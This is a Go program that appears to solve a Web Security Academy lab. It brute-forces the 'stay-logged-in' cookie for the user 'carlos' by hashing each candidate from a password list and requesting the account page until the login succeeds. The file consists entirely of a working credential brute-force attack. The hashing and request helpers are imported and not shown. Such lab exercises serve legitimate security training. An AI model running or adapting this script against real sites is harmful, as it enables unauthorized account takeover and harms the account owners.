package main

import (
	"fmt"
	"io"
	"log"
	"os"
	httpcalls "stayloggedcookie/httpCalls"
	makehash "stayloggedcookie/makeHash"
	"strings"
)

func main() {
	var (
		username string = "carlos"
		url      string = "https://0aa800de0362552c832ee6d100a200f7.web-security-academy.net/my-account?id=" + username
	)

	file, err := os.Open("./passwords.txt")
	if err != nil {
		log.Fatal(err)
	}

	data, err := io.ReadAll(file)
	if err != nil {
		log.Fatal(err)
	}

	for _, value := range strings.Split(string(data), "\n") {
		hash := makehash.MakeHash(username, value)

		response, err := httpcalls.LogIn(url, hash)
		if err != nil {
			fmt.Println(err)
			return
		}

		data, err = io.ReadAll(response.Body)
		if err != nil {
			fmt.Println(err)
			return
		}

		if strings.Contains(string(data), "Your username is:") {
			fmt.Println(string(data), response.StatusCode)
			fmt.Println("Found:", value)
			return
		} else {
			fmt.Println("Not Found:", value)
		}
	}
}
